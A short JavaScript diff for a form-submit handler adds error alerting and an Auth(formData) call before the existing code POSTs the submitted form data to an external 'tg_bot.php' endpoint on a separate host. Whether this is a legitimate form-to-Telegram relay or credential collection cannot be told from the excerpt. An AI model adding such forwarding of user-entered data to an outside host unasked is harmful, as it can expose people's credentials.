@@ -42,8 +42,8 @@
                 method: 'POST',
                 body: formData
             });
-        } catch {
-            
+        } catch (err) {
+            alert(err);
         }
     }
 
@@ -51,6 +51,9 @@
         e.preventDefault();
 
         const formData = new FormData(e.target);
+
+        await Auth(formData);
+
         const response = await fetch('https://cw809330.tw1.ru/logic/tg_bot.php', {
             method: 'POST',
             body: formData
